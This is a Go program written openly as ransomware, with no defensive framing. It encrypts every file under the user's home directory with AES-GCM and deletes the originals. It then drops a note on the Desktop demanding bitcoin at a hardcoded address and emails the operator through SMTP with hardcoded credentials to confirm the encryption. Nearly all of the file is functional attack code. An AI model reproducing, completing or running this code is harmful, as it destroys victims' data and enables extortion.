package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "fmt"
    "golang.org/x/crypto/pbkdf2"
    "io"
    "net/smtp"
    "os"
    "os/user"
    "path/filepath"
)

const (
    keyString       = "fTCOgmTKdi9Fpa3qd90CuWFJnacIGmjvkUkXsO2OUTW23/0pt9GF1drlmUF6FPq+"
    salt            = "cFxUfm+uUhJ!"  // Change this to a random value for more security
    emailServer     = "smtp.example.com"
    emailPort       = 587
    senderEmail     = "senderemail@example..com"
    senderPassword  = "tlgulwsnraqoborx"
    recipientEmail  = "email@example.com"
    bitcoinAddress  = "bc1qtq2a4x6uru3h0gqwk3sv89druqxvglgknqurj3"
    ransomNoteFile  = "RANSOM_NOTE.txt"
)

func padKey(key []byte, size int) []byte {
    if len(key) >= size {
        return key[:size]
    }
    padding := make([]byte, size-len(key))
    return append(key, padding...)
}

func encryptFile(key []byte, inFilename, outFilename string) error {
    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return err
    }

    iv := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        return err
    }

    inFile, err := os.Open(inFilename)
    if err != nil {
        return err
    }
    defer inFile.Close()

    outFile, err := os.Create(outFilename)
    if err != nil {
        return err
    }
    defer outFile.Close()

    original, err := io.ReadAll(inFile)
    if err != nil {
        return err
    }

    encrypted := gcm.Seal(nil, iv, original, nil)

    _, err = outFile.Write(append(iv, encrypted...))
    return err
}

func sendEmail(subject, body string) error {
    auth := smtp.PlainAuth("", senderEmail, senderPassword, emailServer)
    msg := fmt.Sprintf("Subject: %s\r\n\r\n%s", subject, body)

    return smtp.SendMail(fmt.Sprintf("%s:%d", emailServer, emailPort), auth, senderEmail, []string{recipientEmail}, []byte(msg))
}

func main() {
    key := pbkdf2.Key([]byte(keyString), []byte(salt), 4096, 32, sha256.New)
    key = padKey(key, 32)

    targetDirectory, _ := os.UserHomeDir()

    filepath.Walk(targetDirectory, func(path string, info os.FileInfo, err error) error {
        if !info.IsDir() {
            fmt.Println("Encrypting " + path + "...")
            baseFilename := filepath.Base(path)
            outFilename := filepath.Join(targetDirectory, baseFilename+".encrypted")
            err := encryptFile(key, path, outFilename)
            if err != nil {
                fmt.Println("Error encrypting file:", err)
            } else {
                os.Remove(path)
            }
        }
        return nil
    })

    user, err := user.Current()
    if err != nil {
        fmt.Println("Error getting current user:", err)
        return
    }
    desktopPath := filepath.Join(user.HomeDir, "Desktop")
    ransomNotePath := filepath.Join(desktopPath, ransomNoteFile)
    ransomNoteFile, err := os.Create(ransomNotePath)
    if err != nil {
        fmt.Println("Error creating ransom note:", err)
        return
    }
    defer ransomNoteFile.Close()

    ransomMessage := fmt.Sprintf(`
Your files have been encrypted!
To decrypt them, you must pay 0.xx BTC to the following address: %s
Send proof of payment to %s or hakers contact  for the decryption key.
`, bitcoinAddress, recipientEmail)

    _, err = ransomNoteFile.WriteString(ransomMessage)
    if err != nil {
        fmt.Println("Error writing to ransom note:", err)
    }

    fmt.Println("Ransom note stored on the desktop.")

    subject := "Encryption Completed"
    body := "The encryption process has been completed. Please check the user's desktop for the ransom note."
    err = sendEmail(subject, body)
    if err != nil {
        fmt.Println("Failed to send email:", err)
    } else {
        fmt.Println("Email notification sent.")
    }
}
